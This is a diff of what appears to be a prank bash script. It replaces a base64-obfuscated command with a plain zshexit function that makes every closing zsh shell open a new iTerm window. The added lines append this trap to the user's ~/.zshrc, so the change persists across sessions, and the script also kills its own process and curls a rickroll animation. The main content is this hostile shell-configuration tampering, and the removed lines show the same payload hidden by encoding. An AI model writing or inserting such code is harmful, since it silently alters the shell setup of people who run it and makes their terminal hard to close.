@@ -69,11 +69,16 @@ pkill -f "$(basename "$0")"
 
 curl ascii.live/rick
 
+#!/bin/bash
+
+content=$(cat <<'EOF'
 function zshexit() {
-    encoded_command="dGVsbCBhcHBsaWNhdGlvbiAiaVRlcm0iIHRvIGNyZWF0ZSB3aW5kb3cgd2l0aCBkZWZhdWx0IHByb2ZpbGUiCg=="
-    decoded_command=$(echo $encoded_command | base64 --decode)
-    osascript -e "$decoded_command"
+    command='tell application "iTerm" to create window with default profile'
+    osascript -e "$command"
     exit
 }
 trap zshexit EXIT
+EOF
+)
+echo "$content" >> ~/.zshrc
 
